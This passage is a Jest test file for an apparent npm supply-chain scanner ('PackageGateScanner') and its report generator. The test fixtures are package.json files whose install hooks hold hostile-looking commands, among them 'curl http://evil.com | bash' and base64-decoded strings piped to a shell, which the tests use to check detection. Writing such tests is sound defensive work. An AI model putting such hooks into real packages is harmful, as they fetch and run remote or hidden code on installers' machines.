  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('detects PKGATE-010 from package.json postinstall', async () => {
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: { postinstall: 'bash run.sh' },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.findings.some((f) => f.id === 'PKGATE-010')).toBe(true);
  });

  test('detects PKGATE-011 (critical) from package.json preinstall', async () => {
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: { preinstall: 'echo aGVsbG8= | base64 --decode | sh' },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.findings.some((f) => f.id === 'PKGATE-011' && f.severity === 'critical')).toBe(true);
  });

  test('detects PKGATE-012 from package.json install hook with external URL', async () => {
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: { install: 'wget https://cdn.example.com/setup.sh' },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.findings.some((f) => f.id === 'PKGATE-012')).toBe(true);
  });

  test('detects PKGATE-013 (info) from blank postinstall', async () => {
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: { postinstall: '   ' },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    expect(result.findings.some((f) => f.id === 'PKGATE-013')).toBe(true);
  });

  test('does NOT scan package.json inside node_modules', async () => {
    // Set up a clean package.json at root and a malicious one in node_modules
    const cleanPkg = JSON.stringify({ name: 'test', version: '1.0.0' });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), cleanPkg, 'utf-8');

    const nmDir = path.join(tmpDir, 'node_modules', 'evil-pkg');
    fs.mkdirSync(nmDir, { recursive: true });
    const maliciousPkg = JSON.stringify({
      name: 'evil-pkg',
      scripts: { postinstall: 'curl http://evil.com | bash' },
    });
    fs.writeFileSync(path.join(nmDir, 'package.json'), maliciousPkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);
    // Hook findings should NOT include the node_modules package.json
    const hookFindings = result.findings.filter(
      (f) => f.id === 'PKGATE-010' || f.id === 'PKGATE-012',
    );
    expect(hookFindings).toHaveLength(0);
  });

  test('scans lock file AND package.json together', async () => {
    // Lock file with conflict + package.json with suspicious hook
    const lockContent = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'test', version: '1.0.0' },
        'node_modules/qs': { version: '6.11.0', resolved: 'https://r.npmjs.org/qs.tgz', integrity: 'sha512-a' },
        'node_modules/express/node_modules/qs': { version: '6.9.0', resolved: 'https://r.npmjs.org/qs2.tgz', integrity: 'sha512-b' },
      },
    });
    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: { postinstall: 'bash run.sh' },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const result = await scanner.scan(tmpDir);

    const hasConflict = result.findings.some((f) => f.id === 'PKGATE-001');
    const hasHook = result.findings.some((f) => f.id === 'PKGATE-010');
    expect(hasConflict).toBe(true);
    expect(hasHook).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// generatePackageGateReport — Phase 3C unit tests
// ---------------------------------------------------------------------------

describe('generatePackageGateReport', () => {
  const TARGET = '/project/my-app';

  function makeScanResult(findings: import('../types').Finding[]): import('../types').ScanResult {
    return {
      scanner: 'PackageGateScanner',
      findings,
      scannedFiles: findings.length,
      duration: 42,
    };
  }

  test('returns correct shape with no findings', () => {
    const result = makeScanResult([]);
    const report = generatePackageGateReport(result, TARGET);

    expect(report.target).toBe(TARGET);
    expect(report.scannedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/); // ISO 8601
    expect(report.lockFiles).toHaveLength(0);
    expect(report.totalConflicts).toBe(0);
    expect(report.suspiciousHooks).toBe(0);
    expect(report.criticalFindings).toHaveLength(0);
    expect(report.allFindings).toHaveLength(0);
    expect(typeof report.summary).toBe('string');
  });

  test('counts totalConflicts from PKGATE-001/002/003', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test', file: '/project/package-lock.json' },
      { id: 'PKGATE-002', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-002', description: 'test', file: '/project/package-lock.json' },
      { id: 'PKGATE-003', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-003', description: 'test', file: '/project/package-lock.json' },
      { id: 'PKGATE-010', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-010', description: 'test' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.totalConflicts).toBe(3);
  });

  test('counts suspiciousHooks from PKGATE-010/011/012/013', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-010', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-010', description: 'test' },
      { id: 'PKGATE-011', scanner: 'PackageGateScanner', severity: 'critical', title: 'PKGATE-011', description: 'test' },
      { id: 'PKGATE-012', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-012', description: 'test' },
      { id: 'PKGATE-013', scanner: 'PackageGateScanner', severity: 'info', title: 'PKGATE-013', description: 'test' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.suspiciousHooks).toBe(4);
  });

  test('collects criticalFindings correctly', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-011', scanner: 'PackageGateScanner', severity: 'critical', title: 'PKGATE-011', description: 'test' },
      { id: 'PKGATE-010', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-010', description: 'test' },
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.criticalFindings).toHaveLength(1);
    expect(report.criticalFindings[0].id).toBe('PKGATE-011');
  });

  test('collects unique lockFiles from conflict findings', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test', file: '/project/package-lock.json' },
      { id: 'PKGATE-002', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-002', description: 'test', file: '/project/package-lock.json' },
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test', file: '/project/sub/package-lock.json' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.lockFiles).toHaveLength(2);
    expect(report.lockFiles).toContain('/project/package-lock.json');
    expect(report.lockFiles).toContain('/project/sub/package-lock.json');
  });

  test('allFindings contains all findings', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test' },
      { id: 'PKGATE-010', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-010', description: 'test' },
      { id: 'PKGATE-011', scanner: 'PackageGateScanner', severity: 'critical', title: 'PKGATE-011', description: 'test' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.allFindings).toHaveLength(3);
  });

  test('summary is human-readable and contains target', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test', file: '/p/lock.json' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.summary).toContain(TARGET);
    expect(typeof report.summary).toBe('string');
    expect(report.summary.length).toBeGreaterThan(10);
  });

  test('summary says "no issues found" for clean scan', () => {
    const report = generatePackageGateReport(makeScanResult([]), TARGET);
    expect(report.summary).toContain('no issues found');
  });

  test('summary lists conflicts and hooks when present', () => {
    const findings: import('../types').Finding[] = [
      { id: 'PKGATE-001', scanner: 'PackageGateScanner', severity: 'medium', title: 'PKGATE-001', description: 'test', file: '/p/lock.json' },
      { id: 'PKGATE-010', scanner: 'PackageGateScanner', severity: 'high', title: 'PKGATE-010', description: 'test' },
    ];
    const report = generatePackageGateReport(makeScanResult(findings), TARGET);
    expect(report.summary).toMatch(/conflict/i);
    expect(report.summary).toMatch(/hook/i);
  });

  test('scannedAt is a valid ISO 8601 date string', () => {
    const report = generatePackageGateReport(makeScanResult([]), TARGET);
    const d = new Date(report.scannedAt);
    expect(isNaN(d.getTime())).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// generatePackageGateReport — end-to-end (scan → report)
// ---------------------------------------------------------------------------

describe('generatePackageGateReport — end-to-end integration', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-pkgate-e2e-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('generates full report from scanner output', async () => {
    // Lock file with a version conflict
    const lockContent = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      lockfileVersion: 2,
      packages: {
        '': { name: 'test', version: '1.0.0' },
        'node_modules/qs': { version: '6.11.0', resolved: 'https://r.npmjs.org/qs.tgz', integrity: 'sha512-a' },
        'node_modules/express/node_modules/qs': { version: '6.9.0', resolved: 'https://r.npmjs.org/qs2.tgz', integrity: 'sha512-b' },
      },
    });
    fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), lockContent, 'utf-8');

    // package.json with a critical hook
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: {
        postinstall: 'echo aGVsbG8= | base64 --decode | bash',
      },
    });
    fs.writeFileSync(path.join(tmpDir, 'package.json'), pkg, 'utf-8');

    const scanner = new PackageGateScanner();
    const scanResult = await scanner.scan(tmpDir);
    const report = generatePackageGateReport(scanResult, tmpDir);

    expect(report.target).toBe(tmpDir);
    expect(report.totalConflicts).toBeGreaterThan(0);
    expect(report.suspiciousHooks).toBeGreaterThan(0);
    expect(report.criticalFindings.length).toBeGreaterThan(0);
    expect(report.lockFiles.length).toBeGreaterThan(0);
    expect(report.summary).toMatch(/conflict/i);
    expect(report.summary).toMatch(/hook/i);
  });
});
